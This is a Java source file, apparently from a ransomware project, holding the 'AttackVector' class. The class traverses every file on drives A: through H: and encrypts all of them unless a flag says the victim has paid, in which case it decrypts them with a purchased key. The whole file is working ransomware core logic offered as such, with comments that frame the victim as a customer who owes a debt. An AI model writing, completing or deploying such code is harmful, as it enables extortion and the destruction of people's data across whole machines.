package Agent.Attack;

import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.LinkedList;
import java.util.Map;

import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.entites.AlgorithmsMap;
import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;
import Agent.services.KeyService;
import Agent.traversal.*;

public class AttackVector {
	private KeyService keyService;

	// Gets a boolean variable which represent if the costumer paid his debt
	// If he did , the function calls to decrypt the file system - else - encrypt
	// it.
	public void cryptFileSystem(boolean isPaid) throws RansomwareException {

		// Traverse<File> dfs = new DFS<File>();
		// or
		Traverse<File> bfs = new BFS<File>();

		CryptoAlgorithm crypto;
		CryptoKey key = new CryptoKey();
		Collection<File> visitedFolders = new ArrayList<File>();

		if (!isPaid) {
			key = keyService.getKey();
			crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
			encryptFileSystem(keyService.getKey(), bfs, crypto, visitedFolders);
		} else {
			key = keyService.buykey();
			crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
			decryptFileSystem(keyService.buykey(), bfs, crypto, visitedFolders);

		}

	}

	// Gets all of the files in the file system and encrypts them
	private void encryptFileSystem(CryptoKey key, Traverse<File> struct, CryptoAlgorithm crypto,
			Collection<File> visitedFolders) throws RansomwareException {

		for (char i = 'A'; i <= 'H'; i++) {
			LinkedList<File> visitedFiles = traverseFileSystem(i + ":\\", visitedFolders, key, struct);
			try {
				while (!(visitedFiles.isEmpty()))
					crypto.encrypt(key.getKey(), visitedFiles.remove());
			} catch (RansomwareException e) {
				throw new RansomwareException(e.getCause());
			}
		}

	}

	// Gets all of the encrypted files in the files system and decrypts them
	private void decryptFileSystem(CryptoKey key, Traverse<File> struct, CryptoAlgorithm crypto,
			Collection<File> visitedFolders) throws RansomwareException {

		for (char i = 'A'; i <= 'H'; i++) {
			LinkedList<File> visitedFiles = traverseFileSystem(i + ":\\", visitedFolders, key, struct);
			try {
				while (!(visitedFiles.isEmpty())) {
					crypto.decrypt(key.getKey(), visitedFiles.remove());
				}
			} catch (RansomwareException e) {
				throw new RansomwareException(e.getCause());
			}
		}
	}

	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
		return algorithmMap.get(className);
	}

	// Check if specific directory is already found in the folder tree
	private boolean isVisitedFolder(File file, Collection<File> folderTree) {

		return folderTree.stream().parallel().anyMatch(t -> t.equals(file));
	}

	// Traverse the whole file system and adds files to linked list ---> return the
	// linked list to the encrypt/decrypt functions
	private LinkedList<File> traverseFileSystem(String inputDir, Collection<File> dirs, CryptoKey key,
			Traverse<File> struct) {
		LinkedList<File> visitedFiles = new LinkedList<File>();
		struct.add(new File(inputDir));
		while (!(struct.isEmpty())) {
			/* get next file/directory */
			File current = (File) struct.remove();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {

						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
							struct.add(file);
						}

					} else if (file.isFile()) {
						visitedFiles.add(file);

					}
				}
			}

		}
		return visitedFiles;

	}
}
